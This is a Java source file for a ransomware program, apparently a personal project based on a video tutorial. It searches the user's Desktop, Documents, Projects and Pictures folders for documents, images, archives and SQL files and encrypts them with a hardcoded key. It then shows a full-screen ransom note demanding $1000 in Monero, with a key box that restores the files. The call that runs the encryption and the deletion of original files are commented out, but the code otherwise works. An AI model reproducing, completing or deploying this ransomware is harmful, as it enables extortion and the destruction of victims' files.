package com.company;

import org.apache.commons.io.FileUtils;
import java.io.*;
import java.util.*;
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;



public class Main {

    static JFrame f;
    static JLabel l;

    public enum OS { WINDOWS, LINUX, MAC, SOLARIS, BSD, GENERIC };

    private static OS os = null;

    public static String pubKey = "NdRgUkXp2s5u8x/A";

    public static void main(String[] args) throws UnknownSystemException {

        //-------THIS METHOD CALL IS WHERE THE DANGEROUS STUFF HAPPENS
        // let's just leave that commented out until we need it...
//        EncryptFiles();

        DisplayRansomNote();
    }

    public static OS getOS() {//throws UnknownSystemException {
        if (os == null) {
            String oSystem = System.getProperty("os.name").toLowerCase();

            if (oSystem.contains("win")) {
                os = OS.WINDOWS;
            } else if (oSystem.contains("nix") || oSystem.contains("nux") || oSystem.contains("aix")) {
                os = OS.LINUX;
            } else if (oSystem.contains("mac")) {
                os = OS.MAC;
            } else if (oSystem.contains("sun") || oSystem.contains("solar")) {
                os = OS.SOLARIS;
            } else if (oSystem.contains("bsd")) {
                os = OS.BSD;
            } else {
                os = OS.GENERIC;
//                throw new UnknownSystemException("unknown OS detected");
            }
        }

        return os;
    }

    public static void EncryptFiles() throws UnknownSystemException {

        ArrayList<String> CriticalPathList = new ArrayList<>();
        // TODO: add important sensitive directories based on detected OS
        //  maybe also eliminate the exception if none get detected
        //  as we can still do some very basic checks

        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        CriticalPathList.add(System.getProperty("user.home") + "/Projects");
        CriticalPathList.add(System.getProperty("user.home") + "/Pictures");

        switch (getOS()) {
            case WINDOWS:
                //return;
            case LINUX:
                //return;
            case MAC:
                System.out.println("This victim is running MacOS");
            case SOLARIS:
                //return;
            case BSD:
                //return;
        }

        for (String TargetPath: CriticalPathList) {
            System.out.println("TargetPath: " + TargetPath);
            File root = new File(TargetPath);

            try{
                String[] extensions = {"pdf",
                        "doc",
                        "png",
                        "txt",
                        "zip",
                        "rar",
                        "7z",
                        "sql",
                        "xls",
                        "jpg"};
                Collection files = FileUtils.listFiles(root, extensions, true);

                for( Object o: files){
                    File file = (File) o;
                    //System.out.println(" found: " + file.getAbsolutePath());


//                    if (!state){
                    encrypt(file.getAbsolutePath());
//                    } else {
//                        decrypt(file.getAbsolutePath());
//                    }

                    //TODO fix this so it adds the paths to an array, then loop through the array and call EncryptFiles
                    // wtf is this guy doing?
                    // seriously he starts the video off with placeholder methods,
                    // but then he does every fucking thing in FindFiles
                    // I'm going to have to re-work this in my own way... which means one more thing for the "someday maybe" list

                    //  maybe not


                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }

    public static void RescueFiles() throws UnknownSystemException {

        ArrayList<String> CriticalPathList = new ArrayList<>();
        // TODO: add important sensitive directories based on detected OS
        //  maybe also eliminate the exception if none get detected
        //  as we can still do some very basic checks
        //  TLDR: I can make this a lot more sophisticated

        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        CriticalPathList.add(System.getProperty("user.home") + "/Projects");
        CriticalPathList.add(System.getProperty("user.home") + "/Pictures");

        switch (getOS()) {
            case WINDOWS:
                //return;
            case LINUX:
                //return;
            case MAC:
                System.out.println("This victim is running MacOS");
            case SOLARIS:
                //return;
            case BSD:
                //return;
        }


        for (String TargetPath: CriticalPathList) {
            System.out.println("TargetPath: " + TargetPath);
            File root = new File(TargetPath);

            try{
                String[] extensions = {"decrypt"};
                Collection files = FileUtils.listFiles(root, extensions, true);

                for( Object o: files){
                    File file = (File) o;
                    //System.out.println(" found: " + file.getAbsolutePath());





//                    if (!state){
//                        EncryptFiles(file.getAbsolutePath());
//                    } else {
                    decrypt(file.getAbsolutePath());
//                    }

                    //TODO fix this so it adds the paths to an array, then loop through the array and call EncryptFiles
                    // wtf is this guy doing?
                    // seriously he starts the video off with placeholder methods,
                    // but then he does every fucking thing in FindFiles
                    // I'm going to have to re-work this in my own way... which means one more thing for the "someday maybe" list

                    //  maybe not


                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }

    public static void encrypt(String targetFilePath) {

        File targetFile = new File(targetFilePath);
        File encryptedTargetFile = new File(targetFilePath + ".encrypted");

        try {
            CryptoUtils.encrypt(pubKey, targetFile, encryptedTargetFile);
        } catch (CryptoException e) {
            e.printStackTrace();
        }

        //DO NOT DELETE ANYTHING as long as we are developing on the host
        // targetFile.delete();
    }

    public static void decrypt(String encryptedFilePath) {
        File targetFile = new File(encryptedFilePath);
        File decryptedTargetFile = new File(encryptedFilePath + ".decrypted");

        try {
            CryptoUtils.decrypt(pubKey, targetFile, decryptedTargetFile);
        } catch (CryptoException e) {
            e.printStackTrace();
        }

        //DO NOT DELETE ANYTHING as long as we are developing on the host
        // targetFile.delete();
    }

    public static void DisplayRansomNote() {
        f = new JFrame("WARNING");
        l = new JLabel();
        l.setText("Well, everyone makes mistakes, so you shouldn't feel too bad about the one you just made by clicking on that link. Unfortunately, this is going to be a costly one. All of your important files have been encrypted. Nothing has been deleted and the key to decrypt everything is safe with me. In order to receive it and rescue your files, you must send $1000 in Monero at whatever the current market rate is for the day you do the transaction (I'll know what it is for the day based on timestamps, so don't try and short me). If you don't know how to use cryptocurrencies, then, well, Google and YouTube are going to be your friends, but I am unfortunately not willing to hold your hand there. But rest assured, once you figure it out and send the stated amount to <address>, you will be able to go about your day (and hopefully learn a lesson about internet behavior).");
        JPanel p = new JPanel();
        p.add(l);
        f.add(p);

        //------ receive user key for recovery
        JPanel panel = new JPanel();
        JLabel label = new JLabel(" Enter the key: ");
        JTextField textf = new JTextField(128);

        JButton submit = new JButton(" Restore files ");
        JButton reset = new JButton(" Reset ");

        submit.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                //JOptionPane.showMessageDialog(f, "test");
                String strVictimKey = textf.getText();

                if (strVictimKey.equals(pubKey)) {   // here's our cmp call, likely
                    try {
                        RescueFiles();
                        JOptionPane.showMessageDialog(f, "Your files have been successfully decrypted");
                    } catch (UnknownSystemException ex) {
                        // ex.printStackTrace();
                        JOptionPane.showMessageDialog(f, "There was an error decryptinig your files" + ex.toString());
                    }

                } else {
                    JOptionPane.showMessageDialog(f, "Invalid key");
                }
            }
        });

        panel.add(label);
        panel.add(textf);
        panel.add(submit);
        panel.add(reset);

        f.getContentPane().add(BorderLayout.NORTH, label);
        f.getContentPane().add(BorderLayout.SOUTH, panel);

        f.setVisible(true);
        f.setExtendedState(JFrame.MAXIMIZED_BOTH);
        //f.setUndecorated(true);
        //f.setVisible(true);
    }
}

class UnknownSystemException extends Exception {

    public UnknownSystemException(String s) {
        super(s);
    }
}